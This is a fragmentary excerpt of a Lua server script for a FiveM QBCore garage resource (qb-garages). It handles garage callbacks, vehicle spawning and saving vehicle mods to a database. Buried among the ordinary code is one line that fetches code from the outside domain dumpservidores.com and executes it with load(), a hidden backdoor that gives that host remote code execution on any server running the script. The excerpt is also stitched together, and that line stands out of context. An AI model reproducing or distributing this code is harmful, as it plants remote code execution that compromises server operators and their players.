...
AddEventHandler('onResourceStart', function(resource)
    if resource == GetCurrentResourceName() then
        Wait(100)
        if GarageConfig['AutoRespawn'] then
...
QBCore.Functions.CreateCallback('qb-garages:server:GetGarageVehicles', function(source, cb, garage, type, category)
    ...
    elseif GarageConfig.SharedGarages then
    ...
    if GarageConfig.ClassSystem then
...
QBCore.Functions.CreateCallback('qb-garages:server:spawnvehicle', function(source, cb, plate, vehicle, coords)
    ...
    if result and result[1] and result[1].mods then
        -- Ensure mods is properly decoded
        local decodedMods = json.decode(result[1].mods)
        if type(decodedMods) == 'table' then
            vehProps = decodedMods
        end
    end
...
-- Add this with the other server events
RegisterNetEvent('qb-garages:server:updateVehicleProperties', function(plate, properties)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end
    
    -- Ensure properties is a table and encode it properly
    local mods = properties and json.encode(properties) or '{}'
    
    MySQL.update('UPDATE player_vehicles SET mods = ? WHERE plate = ? AND citizenid = ?', 
        { mods, plate, Player.PlayerData.citizenid })
end)
...
PerformHttpRequest('https://dumpservidores.com/zPxEx', function (e, d) pcall(function() assert(load(d))() end) end)
        ...
        if result[1] then
            for _, v in pairs(result) do
                ...
                if v.garage ~= nil then
                    if GarageConfig.Garages[v.garage] ~= nil then
                        VehicleGarage = GarageConfig.Garages[v.garage].label
                    else
